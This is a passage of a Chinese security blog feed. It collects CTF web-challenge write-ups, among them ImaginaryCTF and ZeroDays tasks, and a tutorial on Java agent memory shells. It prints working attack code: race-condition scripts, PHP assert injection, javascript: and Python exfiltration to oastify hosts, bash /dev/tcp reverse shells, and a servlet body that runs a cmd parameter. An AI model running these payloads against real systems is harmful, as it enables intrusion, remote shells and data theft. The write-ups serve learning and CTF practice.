&lt;= whiskey_limit:            session_data[sess_id][&#x27;whiskey_limit&#x27;] = whiskey_limit - order[&#x27;quantity&#x27;]        else:            return &quot;Order fail - over whiskey limit&quot;    session_data[sess_id][&#x27;orders&#x27;].append((order[&#x27;item&#x27;], order[&#x27;quantity&#x27;]))    return f&quot;Order placed successfully: &#123;order[&#x27;item&#x27;]&#125; x &#123;order[&#x27;quantity&#x27;]&#125;&quot;

该函数主要就是从session中获取到威士忌还能买的数量后再进行购买
代码中设定了顶多只能买两瓶
但是从下面代码中国我们可以得知要想获取到flag，那么威士忌购买数量必须要大于两瓶才可以
@app.route(&#x27;/order-list&#x27;)def orderlist():    flagval = &quot;No flag yet, not enough drink ordered&quot;    sess_id = session.get(&#x27;session_id&#x27;)    orders = session_data[sess_id][&#x27;orders&#x27;]    drink_count = 0    for order in orders:        item,quantity = order        if item == &#x27;whiskey&#x27;:            drink_count+=quantity    if drink_count &gt; 2:        flagval = flag    return render_template(&#x27;orderlist.html&#x27;, orders=orders, whiskey_limit=session_data[sess_id][&#x27;whiskey_limit&#x27;], flag=flagval)

回头再研究一下order()函数，发现一行代码很奇怪：time.sleep(1)
无缘无故的，这样搞不就可以用上条件竞争了嘛
脚本如下：
import requestsimport threadingfrom threading import Threadhost = &quot;http://127.0.0.1:9876&quot;# 获取 cookieresponse = requests.head(host)cookie = response.headers.get(&#x27;Set-Cookie&#x27;).split(&#x27;;&#x27;)[0]print(cookie)# 发送订单的函数def send_order():    headers = &#123;        &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,        &#x27;Cookie&#x27;: cookie    &#125;    data = &#123;        &#x27;item&#x27;: &#x27;whiskey&#x27;,        &#x27;quantity&#x27;: &#x27;1&#x27;    &#125;    requests.post(f&quot;&#123;host&#125;/order&quot;, headers=headers, json=data)# 创建并启动多个线程发送订单threads = []for _ in range(4):    t = Thread(target=send_order)    t.start()    threads.append(t)# 等待所有线程完成for t in threads:    t.join()# 获取订单列表并检查 Flagresponse = requests.get(f&quot;&#123;host&#125;/order-list&quot;, headers=&#123;&#x27;Cookie&#x27;: cookie&#125;)if &quot;Flag&quot; in response.text:    print(&quot;Found Flag in response:&quot;)    print(response.text)else:    print(&quot;No Flag found in response&quot;)

成功拿到flag
Familiar Faces首先我们看到有写一个bot，会每隔60秒就把falg传到session里面，参数名是secret
然后再看index.php
有一段代码是会打印出你session中的secret值

当然上面有段代码是写进secret值的
再往下审计，直接将get传参的值进行了拼接，没有任何的检测
然后再对$countyPath目录下面的文件进行遍历

那我们就目录穿越，apache服务下面session文件默认是在tmp目录下面

发现session文件内容都没打印出来，只有session文件名
当时卡了一会，经朋友提醒才想起来session文件名的sess_后面的部分就是我们的cookie值
进行更改，成功打印出flag

spinmaster这题题解说是0day

/?method=POST%20/flag%20HTTP/1.1%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%209%0d%0a%0d%0agive=flag

ApacheCultureNightapache&#x2F;httpd版本要低于2.4.60
该题所涉及到的漏洞及其利用都位于该篇文章中：https://blog.orange.tw/posts/2024-08-confusion-attacks-en/
从文章中我们可以了解到该题用到的是文件名混淆攻击，通过apache内部各个模块之间的交流沟通有一定问题的情况下进行的攻击

文章中提到的mod_rewirte，我们在看httpd.conf文件时在其末尾有写到

 mod_rewrite 强制将所有重写的结果视为 URL，因此即使目标是文件系统路径，也可以在问号处截断
利用问号进行截断来访问原本访问不到的文件，题目仅开放了files目录下面的访问权限，而我们的flag.txt文件也恰好在该目录下面
所以我们的payload如下
curl http://172.17.0.2/flag.txt%3flol.png

quote-of-the-day搭起来的docker容器，题目里面的各个按钮功能先自己测试一遍
看app.py文件，重点关注下面这段代码
@app.route(&#x27;/api/report&#x27;, methods=[&#x27;POST&#x27;])def report():    url = request.json.get(&#x27;url&#x27;)    r = requests.post(&#x27;http://bot:3000/visit&#x27;, json=&#123;&quot;url&quot;: url&#125;)    if r.status_code == 200:        return jsonify(&#123;&quot;status&quot;: &quot;success&quot;&#125;)    return jsonify(&#123;&quot;status&quot;: &quot;failure&quot;&#125;)

发现是给bot发了一个请求
那我们就去看看跟bot有关的代码文件——app.js，flag位置：const FLAG = process.env.FLAG || &#39;ZeroDays&#123;fake_flag&#125;&#39;;
下面有定义一个POST的visit路由，接收一个包含url的JSON请求体
在page.evaluateOnNewDocument中，将FLAG写入localStorage的session项。这一步可能是在页面加载之前注入一些数据，比如用户的会话信息或者flag本身。然后访问http://web:5000/，并再次在页面上下文中将FLAG写入localStorage的FLAG项
在这之后，会再次导航到我们传过去的url
没有对我们传的url进行任何的检测，这就说明我们可以上传一个恶意的url
总结一下visit路由相关代码逻辑，流程是：

创建新页面。
在页面加载前注入localStorage的session项。
导航到web:5000，并再次设置FLAG到localStorage。
然后导航到用户提供的url。
等待3秒后关闭页面。

我们传过去的如果是javascript: URI的话，执行的环境是当前页面的源，也就是web:5000，所以可以访问该源的localStorage。因此，如果攻击者提交的url是javascript:…这样的代码，那么当页面导航到该URL时，会执行该脚本，此时就可以读取localStorage中的FLAG，并将其外泄
payload：
javascript:fetch(&#x27;http://nja4ij5myfi8rnuavztvkob4vv1mpcd1.oastify.com?flag=&#x27; + encodeURIComponent(localStorage.FLAG))

外带成功

]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/10/05/hello-world/</url>
    <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
Quick StartCreate a new post$ hexo new &quot;My New Post&quot;

More info: Writing
Run server$ hexo server

More info: Server
Generate static files$ hexo generate

More info: Generating
Deploy to remote sites$ hexo deploy

More info: Deployment
]]></content>
  </entry>
  <entry>
    <title>java内存马之java-agent</title>
    <url>/2025/05/21/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bjava-agent/</url>
    <content><![CDATA[参考Java内存马Java-Agent篇
概念一个运行中的 Java 程序运行在一个 JVM（Java 虚拟机）实例中。
Java Agent可以在程序运行时动态地修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。
对于 Agent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的premain-Agent，另一种是 JVM 启动之后加载的agentmain-Agent。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图：Premain-Agent

agentmain-Agent

Java Agent实例环境配置起一个默认的Maven环境。
在项目的&#x2F;src&#x2F;main&#x2F;目录下创建resources目录，并往下创建META-INF目录，在该目录下创建MANIFEST.MF文件，目录结构如下图：


在pom.xml中添加如下代码：
&lt;build&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;            &lt;version&gt;2.6&lt;/version&gt;            &lt;configuration&gt;                &lt;descriptorRefs&gt;                    &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;                &lt;/descriptorRefs&gt;                &lt;archive&gt;                    &lt;manifestFile&gt;                        src/main/resources/META-INF/MANIFEST.MF                    &lt;/manifestFile&gt;                &lt;/archive&gt;            &lt;/configuration&gt;            &lt;executions&gt;                &lt;execution&gt;                    &lt;phase&gt;package&lt;/phase&gt;                    &lt;goals&gt;                        &lt;goal&gt;single&lt;/goal&gt;                    &lt;/goals&gt;                &lt;/execution&gt;            &lt;/executions&gt;        &lt;/plugin&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;            &lt;configuration&gt;                &lt;source&gt;6&lt;/source&gt;                &lt;target&gt;6&lt;/target&gt;            &lt;/configuration&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;

premain-Agent
下面的文件都放到&#x2F;src&#x2F;main&#x2F;java目录也就是代码根目录下，要不然最后运行的时候会报URLClassLoader找不到这些类

从上面流程图可知，在运行一个类的main方法之前，会先调用指定jar包中Premain-Class类中的premain方法。
先创建一个premain-Agent类：
import java.lang.instrument.Instrumentation;public class Java_Agent_premain &#123;    public static void premain(String args, Instrumentation inst) &#123;        for (int i =0 ; i&lt;10 ; i++)&#123;            System.out.println(&quot;premain-Sleep_Transformer&quot;);        &#125;    &#125;&#125;

MANIFEST.MF文件内容如下：
Manifest-Version: 1.0Premain-Class: org.example.Java_Agent_premain

先创建Java Agent的class文件，再打包成jar：
REM 创建class文件javac Java_Agent_premain.javaREM 生成Java Agent的jarjar cvfm agent.jar ../../../resources/META-INF/MANIFEST.MF Java_Agent_premain.class

然后我们就在当前目录下看到了agent.jar包。
我们再创建一个Hello类，表示一个正常运行的程序，或者说受害程序：
public class Hello &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;Hello World!&quot;);    &#125;&#125;

修改一下MANIFEST.MF：
Manifest-Version: 1.0Main-Class: org.example.Hello

接着生成class，创建jar：
REM 创建class文件javac Hello.javaREM 生成Java Agent的jarjar cvfm hello.jar ../../../resources/META-INF/MANIFEST.MF Hello.class

到这里为止当前目录下的文件如下所示：
我们现在要在hello.jar执行之前执行agent.jar，执行命令如下：
java -javaagent:agent.jar=Hello -jar hello.jar

结果如下图：

agentmain-Agent相较于premain-Agent只能在JVM启动前加载，agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。
跟agentmain-Agent有关的两个类：

com.sun.tools.attach.VirtualMachine
com.sun.tools.attach.VirtualMachineDescriptor

VirtualMachine类可以获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等。该类的主要方法如下：
//允许我们传入一个JVM的PID，然后远程连接到该JVM上VirtualMachine.attach() //向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理VirtualMachine.loadAgent() //获得当前所有的JVM列表VirtualMachine.list() //解除与特定JVM的连接VirtualMachine.detach()

VirtualMachineDescriptor类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。
我们可以通过利用上面两个类，获得一个正常运行的JVM，并实现一些功能，比如获取JVM的PID：
package Test2;import com.sun.tools.attach.VirtualMachine;import com.sun.tools.attach.VirtualMachineDescriptor;import java.util.List;public class GetPID &#123;    public static void main(String[] args) &#123;        List&lt;VirtualMachineDescriptor&gt; vm = VirtualMachine.list();        for (VirtualMachineDescriptor vmd : vm) &#123;            if (vmd.displayName().equals(&quot;Test2.GetPID&quot;)) &#123;                System.out.println(vmd.id());            &#125;        &#125;    &#125;&#125;

运行后结果如下：
下面我们要开始进行攻击了。先创建一个Sleep_Hello类，模拟一个正常运行的程序：
package Test2;import static java.lang.Thread.sleep;public class Sleep_Hello &#123;    public static void main(String[] args) throws InterruptedException &#123;        while (true)&#123;            System.out.println(&quot;Hello World!&quot;);            sleep(5000);        &#125;    &#125;&#125;

然后创建一个Java_Agent_agentmain类，其作为一个Java Agent，将会被打包成jar并注入到JVM里：
package Test2;import java.lang.instrument.Instrumentation;import static java.lang.Thread.sleep;public class Java_Agent_agentmain &#123;    public static void agentmain(String args, Instrumentation inst) throws InterruptedException &#123;        while (true)&#123;            System.out.println(&quot;调用了Java Agent!&quot;);            sleep(3000);        &#125;    &#125;&#125;

接下来是编译成class并一一打包成jar，我选择修改&#x2F;src&#x2F;main&#x2F;resources&#x2F;META-INF&#x2F;MANIFEST.MF文件（与学习premain-Agent所使用的MANIFEST.MF路径不同）。
Manifest-Version: 1.0Agent-Class: Test2.Java_Agent_agentmain

我们前面已经把pom.xml设置好了，直接运行命令：（在idea的终端就可以了）
mvn clean compile assembly:single   

然后会在target命令下生成对应的jar：

现在有了jar，但是不可能说直接上传jar就可以攻击程序，我们需要执行一段代码，让该Java Agent注入到目标JVM里，这里就再创建一个类实现这段代码：
package Test2;import com.sun.tools.attach.*;import java.io.IOException;import java.util.List;public class Inject_Agent &#123;    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;        //调用VirtualMachine.list()获取正在运行的JVM列表        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();        for(VirtualMachineDescriptor vmd : list)&#123;            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent            if(vmd.displayName().equals(&quot;Test2.Sleep_Hello&quot;))&#123;                //连接指定JVM                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());                //加载Agent                virtualMachine.loadAgent(&quot;Path\\to\\horses3-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;);                //断开JVM连接                virtualMachine.detach();            &#125;        &#125;    &#125;&#125;

先运行Test2.Sleep_Hello，然后再运行Inject_Agent。Inject_Agent会找到Test2.Sleep_Hello对应的JVM，并把Java Agent的jar注入其中，然后Java Agent里的恶意代码就跟着执行了：

动态修改字节码 Instrumentation动态修改字节码，直接都学过都是用javassist来进行修改的，所以我们先加上依赖
&lt;dependency&gt;    &lt;groupId&gt;org.javassist&lt;/groupId&gt;    &lt;artifactId&gt;javassist&lt;/artifactId&gt;    &lt;version&gt;3.27.0-GA&lt;/version&gt;  &lt;/dependency&gt;

Instrumentation是JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标JVM进行交互，从而达到修改数据的效果。
该类是一个接口，其方法如下所示：
public interface Instrumentation &#123;        //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);     //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。    void addTransformer(ClassFileTransformer transformer);     //删除一个类转换器    boolean removeTransformer(ClassFileTransformer transformer);     //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;     //判断一个类是否被修改    boolean isModifiableClass(Class&lt;?&gt; theClass);     // 获取目标已经加载的类。    @SuppressWarnings(&quot;rawtypes&quot;)    Class[] getAllLoadedClasses();     //获取一个对象的大小    long getObjectSize(Object objectToSize); &#125;

这里的类转换器是ClassFileTransformer接口，该接口下只有一个方法：transform，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在java agent内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与addTransformer搭配使用。
//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。      void addTransformer(ClassFileTransformer transformer, boolean canRetransform);

那么如何运用到攻击中呢？前文谈到的agentmain-Agent里可以执行任意代码，那么就这么写：
package Test3;import java.lang.instrument.Instrumentation;import java.lang.instrument.UnmodifiableClassException;public class Attack_jar &#123;    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException &#123;        Class[] classes = inst.getAllLoadedClasses();        for (Class aClass : classes) &#123;            if (aClass.getName().equals(&quot;Test3.Sleep&quot;)) &#123;                inst.addTransformer(new Sleep_Transformer(), true);                inst.retransformClasses(aClass);            &#125;        &#125;    &#125;&#125;

Test3.Sleep类似Test2.Sleep_Hello类，模拟一个正常的程序：
package Test3;import static java.lang.Thread.sleep;public class Sleep &#123;    public static void main(String[] args) throws Exception &#123;        while(true)&#123;            hello();            sleep(3000);        &#125;    &#125;    public static void hello() &#123;        System.out.println(&quot;Hello&quot;);    &#125;&#125;

Sleep_Transformer类是一个实现了ClassFileTransformer接口的类，其利用javassist修改Test3.Sleep类的hello方法：
package Test3;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain;public class Sleep_Transformer implements ClassFileTransformer &#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        try &#123;            //获取CtClass 对象的容器 ClassPool             ClassPool classPool = ClassPool.getDefault();            //添加额外的类搜索路径            if (classBeingRedefined != null) &#123;                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);                classPool.insertClassPath(ccp);            &#125;            //获取目标类            CtClass ctClass = classPool.get(&quot;Test3.Sleep&quot;);            System.out.println(ctClass);            //获取目标方法            CtMethod ctMethod = ctClass.getDeclaredMethod(&quot;hello&quot;);            //设置方法体            String body = &quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;;            ctMethod.setBody(body);            //返回目标类字节码            byte[] bytes = ctClass.toBytecode();            return bytes;        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;        return null;    &#125;&#125;

然后在Attack_jar类也就是Java Agent会调用Instrumentation类的retransformClasses方法重新加载Test3.Sleep类，接着生成对应的jar包，并注入到Test3.Sleep对应的JVM中。写一个类实现该过程：
package Test3;import com.sun.tools.attach.VirtualMachine;import com.sun.tools.attach.VirtualMachineDescriptor;import java.util.List;public class Attack_main &#123;    public static void main(String[] args) throws Exception&#123;        //调用VirtualMachine.list()获取正在运行的JVM列表        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();        for(VirtualMachineDescriptor vmd : list)&#123;            System.out.println(vmd.displayName());            //遍历每一个正在运行的JVM，如果JVM名称为Test3.Sleep则连接该JVM并加载特定Agent            if(vmd.displayName().equals(&quot;Test3.Sleep&quot;))&#123;                //连接指定JVM                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());                //加载Agent                virtualMachine.loadAgent(&quot;Path\\to\\horses3-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;);                //断开JVM连接                virtualMachine.detach();            &#125;        &#125;    &#125;&#125;

生成jar包的配置文件MANIFEST.MF需要再添加两行，告诉JVM这个Agent支持 类重定义和类再转换（retransform）的能力。不然会报错
修改后的MANIFEST.MF：
Manifest-Version: 1.0Agent-Class: Test3.Attack_jarCan-Redefine-Classes: true  Can-Retransform-Classes: true

按上面的顺序运行，结果如下：

在实战中设置的方法体一般如下所示：
String body = &quot;&#123;&quot; +        &quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot; +        &quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot; +        &quot;if (cmd !=null)&#123;\n&quot; +        &quot;  Runtime.getRuntime().exec(cmd);\n&quot; +        &quot;  &#125;&quot;+        &quot;&#125;&quot;;

]]></content>
      <categories>
        <category>java内存马</category>
      </categories>
  </entry>
  <entry>
    <title>imaginaryctf-writeup</title>
    <url>/2024/07/25/imaginaryctf-writeup/</url>
    <content><![CDATA[journal关注重点代码
&lt;?phpecho &quot;&lt;p&gt;Welcome to my journal app!&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;&lt;a href=/?file=file1.txt&gt;file1.txt&lt;/a&gt;&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;&lt;a href=/?file=file2.txt&gt;file2.txt&lt;/a&gt;&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;&lt;a href=/?file=file3.txt&gt;file3.txt&lt;/a&gt;&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;&lt;a href=/?file=file4.txt&gt;file4.txt&lt;/a&gt;&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;&lt;a href=/?file=file5.txt&gt;file5.txt&lt;/a&gt;&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;&quot;;if (isset($_GET[&#x27;file&#x27;])) &#123;  $file = $_GET[&#x27;file&#x27;];  $filepath = &#x27;./files/&#x27; . $file;  assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Invalid file!&quot;);  if (file_exists($filepath)) &#123;    include($filepath);  &#125; else &#123;    echo &#x27;File not found!&#x27;;  &#125;&#125;echo &quot;&lt;/p&gt;&quot;;

首先我们可以注意到我们需要get传参file，然后下面禁掉了..以避免目录穿越，然后当assert的结果为false的时候会执行后面的代码并结束进程
经过了一段时间的尝试后我们对于Include函数做不了文章，所以关键点就在于assert函数处
这时候上网搜索了一下，php7.9，assert，漏洞，给我推了一篇文章，让我明白了我们可以尝试逃脱单引号包括
所以payload为：?file=file1.txt&#39; and die(system(&#39;ls /&#39;)) or&#39;，由于是and，所以会接着执行die中的语句
得到了具体的文件名，我们只需要cat一下flag就出来啦
其实正解应该是闭合strpos函数，然后构造属于我们自己的语句
所以payload为：?file=zz&#39;,&#39;..&#39;)==false%26%26system(&#39;ls /&#39;);//，由于是get传参，所以&amp;要编码
readme这道题你只需要看dockerfile文件就好了，flag就在里面
P2C首先认真阅读app.py，其中的函数xec作用是接受一段代码字符串，生成一个唯一的文件名并创建文件，将代码写入文件，并添加 main 函数定义及调用 rgb_parse，设置文件权限为755，以 user 用户身份运行生成的 Python 文件，并捕获输出，之后删除生成的文件并返回执行结果
下面路由作用是处理 GET 和 POST 请求。该路由的主要功能是接收用户提交的一段代码，通过 xec 函数执行这段代码，并根据执行结果生成一个 RGB 颜色值，然后将这个颜色值传递给 index.html 模板进行渲染
题目有提供给我们dockerfile，所以我们可以本地起个docker自己调试
众所周知我们post传参的内容会写进一个main()函数中，而python中是允许函数内部import库以及定义其他函数并执行
该题不会有任何回显，只有背景颜色的变化，因此我们需要思考要怎么让我们需要的内容回显
这边有一个思路，就是将内容给传参到另一个网址上，那个网址要处于我们的监听中或者是用bp中的collaborator模块生成的网址
还有一个需要注意的点就是我们只能用到python自带的库，比如在发送请求的时候就不能用requests库
综上，我们的脚本如下：
import urllib.requestimport subprocessimport urllib.parsedef fetch_data():    # 获取 flag.txt 文件内容    result = subprocess.run([&#x27;cat&#x27;, &#x27;flag.txt&#x27;], capture_output=True, text=True)    flag = result.stdout.strip()  # 获取输出并去掉多余的空白字符或换行符    # 准备 POST 请求的数据    data = urllib.parse.urlencode(&#123;&#x27;flag&#x27;: flag&#125;).encode()    # 定义 URL    url = &quot;http://98fblnzfud30168qw6nczlq34ualyhm6.oastify.com/&quot;    # 发送 POST 请求    req = urllib.request.Request(url, data=data)    response = urllib.request.urlopen(req)    result = response.read().decode(&#x27;utf-8&#x27;)    return result# 获取并打印结果result = fetch_data()


到bp中查看，得到flag
还有一种方法，在没有任何回显的情况下，我们也可以反弹shell
因此我们的脚本如下所示：
import subprocesscommand = &quot;/bin/bash -i &gt;&amp; /dev/tcp/5.5.5.5/2333 0&gt;&amp;1&quot;subprocess.call(command, shell=True)a=&quot;Hello&quot;return a

在点击run code之前我们需要先去监听2333端口：nc -lvvp 2333
点击，但是反弹shell失败了
幸好可以本地进行调试，所以我们可以在docker的终端上直接运行python3 文件名，但是文件不是执行后就直接删掉了吗，我们要怎么获取到文件名呢
其实很简单，我们不是本地调试吗，那只要把删掉文件名的那行代码删掉就可以了，文件就会保存在&#x2F;tmp&#x2F;uploads目录下，不会被删掉
所以我们直接cd到该目录下，执行文件，发现报错如下：

将报错拿给gpt，告诉我原因其实是因为我还处于sh环境下，后面的代码中有些语法该环境不支持，所以修改后的脚本如下：
import subprocessdef execute_reverse_shell():    command = &quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/47.113.102.46/2333 0&gt;&amp;1&#x27;&quot;    # 执行反弹 shell 命令    subprocess.call(command, shell=True)    # 代码到达这里后反弹 shell 命令已执行    a = &quot;Hello&quot;    return a# 调用函数并打印返回值result = execute_reverse_shell()print(result)

shell反弹成功，如下所示：

实现rce，可以得到flag啦
接下来的方法是官方wp的，就是通过 rgb_parse 函数为每个可能的 ASCII 值（0 到 255）生成对应的 RGB 值，然后把flag的每个字符一一比对，其实就是相当于盲注感觉，脚本如下：
import stringimport requestsimport reimport randomdef rgb_parse(seed, inp=&quot;&quot;):   # 设置随机数种子（种子相同，每次生成的随机数相同；伪随机）   random.seed(seed)   # 将输入转换为字符串   inp = str(inp)   # 生成一个100到1000之间的随机整数作为随机化因子   randomizer = random.randint(100, 1000)   # 初始化总和为0   total = 0   # 遍历输入字符串的每个字符   for n in inp:      # 获取字符的ASCII码值      n = ord(n)      # 将字符的ASCII码值和1到10之间的随机整数相加，并累加到总和中      total += n+random.randint(1, 10)   # 计算RGB值   rgb = total*randomizer*random.randint(100, 1000)   # 对RGB值取模，确保结果在0到999999999之间   rgb = str(rgb%1000000000)   # 从RGB值中提取R、G、B的数值，并加上一定的偏移量   r = int(rgb[0:3]) + 29   g = int(rgb[3:6]) + random.randint(10, 100)   b = int(rgb[6:9]) + 49   # 对R、G、B值取模，确保结果在0到255之间   r, g, b = r%256, g%256, b%256   return (r, g, b)lookup = &#123;rgb_parse(i, &quot;aaa&quot;):i for i in range(256)&#125; #构造字典，通过 rgb_parse 函数为每个可能的 ASCII 值（0 到 255）生成对应的 RGB 值flag = &quot;ictf&#123;&quot;valid = re.compile(r&quot;\([0-9]&#123;1,3&#125;, [0-9]&#123;1,3&#125;, [0-9]&#123;1,3&#125;\)&quot;) #正则表达式，用于匹配返回的 RGB 值while flag[-1] != &quot;&#125;&quot;:        payload = f&quot;&quot;&quot;import randomimport subprocessflag = subprocess.check_output(&quot;cat flag.txt&quot;, shell=True, text=True)flag = flag.strip()   #去除开头结尾空白字符random.seed(ord(flag[&#123;len(flag)&#125;]))   #设置随机种子return &quot;aaa&quot;&quot;&quot;&quot;        #利用正则表达式在响应文本中搜索匹配项，并从中提取出 RGB 值        match = re.search(valid, requests.post(&quot;http://34.91.38.193/&quot;, data=&#123;&quot;code&quot; : payload&#125;).text)        match = match.group()[1:-1] #获取完整的匹配字符串；[1:-1] 去掉字符串的第一个和最后一个字符，即去掉括号        match = tuple(map(int, match.split(&quot;, &quot;))) #将字符串中的 RGB 值转换为整数,最后变成元组形式        flag += chr(lookup[match]) #将元组形式的 RGB 值转换为 ASCII 字符，并追加到 flag 字符串中        print(flag)

脚本在本地运行，就可以得到flag了
crystals本题的代码其实没什么好看的，就是单纯的ruby框架代码，重点的是docker-compose.yml文件

可以看到我们需要的flag位于hostname（主机名）中，当出现hostname时，其原本的值会被环境变量$FLAG代替掉
所以现在的重点是要怎么让服务爆出hostname
于是我利用gpt让它给我整理了可以使ruby服务报错的一系列特殊字符，如下：
&#x27;&quot;#&#123;&#125;()[]&#123;&#125;+*?|\^$&amp;&lt;&gt;;`~!@#%=:

用bp抓个包后将上述代码get传参进去，如下：

得到flag
ruby其实是一种模板，所以上述使用到的一系列特殊字符其实是包含了各种模板语言的模板语法的模糊字符串，会弹出报错信息
因此这题事实上是ssti注入，这题起到关键作用的其实是&#123;&#125;
readme2源码及自己的部分注释奉上：
const flag = process.env.FLAG || &#x27;ictf&#123;this_is_a_fake_flag&#125;&#x27;Bun.serve(&#123;	async fetch(req) &#123;		// 创建一个URL对象，使用请求的URL		const url = new URL(req.url)		// 如果请求的pathname为&#x27;/&#x27;，则返回&#x27;Hello, World!&#x27;的响应		if (url.pathname === &#x27;/&#x27;) return new Response(&#x27;Hello, World!&#x27;)		// 如果请求的pathname以&#x27;/flag.txt&#x27;开头，则返回flag的响应		if (url.pathname.startsWith(&#x27;/flag.txt&#x27;)) return new Response(flag)		// 如果请求的pathname不匹配以上两种情况，则返回404 Not Found的响应		return new Response(`404 Not Found: $&#123;url.pathname&#125;`, &#123; status: 404 &#125;)	&#125;,	port: 3000&#125;)Bun.serve(&#123;	async fetch(req) &#123;		// 如果请求的 URL 包含 &#x27;flag&#x27;，则返回状态码为 403 的响应		if (req.url.includes(&#x27;flag&#x27;)) return new Response(&#x27;Nope&#x27;, &#123; status: 403 &#125;)		// 检查请求头中是否包含 &#x27;flag&#x27;		const headerContainsFlag = [...req.headers.entries()].some(([k, v]) =&gt; k.includes(&#x27;flag&#x27;) || v.includes(&#x27;flag&#x27;))		// 如果请求头中包含 &#x27;flag&#x27;，则返回状态码为 403 的响应		if (headerContainsFlag) return new Response(&#x27;Nope&#x27;, &#123; status: 403 &#125;)		// 创建 URL 对象		const url = new URL(req.url)		// 如果 URL 的 href 包含 &#x27;flag&#x27;，则返回状态码为 403 的响应		if (url.href.includes(&#x27;flag&#x27;)) return new Response(&#x27;Nope&#x27;, &#123; status: 403 &#125;)		// 发送请求到本地服务器的 3000 端口，并将请求的 method、headers 和 body 传递给新的请求		return fetch(new URL(url.pathname + url.search, &#x27;http://localhost:3000/&#x27;), &#123;			method: req.method,			headers: req.headers,			body: req.body		&#125;)	&#125;,	port: 4000 // only this port are exposed to the public&#125;)

只能说没有思路，去看其他师傅的wp
在端口4000使用的函数会先验证请求的url和标头是否有flag，使用 JavaScript API URL 来解析请求的 URL，并再次检查解析的 URL 是否包含flag
在上面两个检查都通过的前提下，才会想3000端口发送请求
因此我们需要通过某种方式绕过4000端口的检测，下面为别人的思路

通过docker查看报错信息，如下：
url解析出错
稍微更改一下app.js文件，如下：

会发现我们的pathname前面多了一个/
如果我们阅读有关 API URL 的 mdn Web 文档，我们可以看到这个无效的 URL 示例：

但是如果我们在&#x2F;加上一些东西呢，比如：/foobar

惊奇地发现多了http协议，并且发送了请求
于是我们可以来个302跳转来得到flag，文件如下：
&lt;?php header(&quot;Location:http://localhost:3000/flag.txt&quot;);

于是我们的payload为：http://localhost:5775//5.5.5.5:9320
the_amazing_race这道题的解题思路来看看这位佬的wp：https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/The-Amazing-Race/
简而言之就是利用条件竞争，那位师傅讲的很详细，我就不宜多说了
这边提供一下官方题解的脚本，如下：
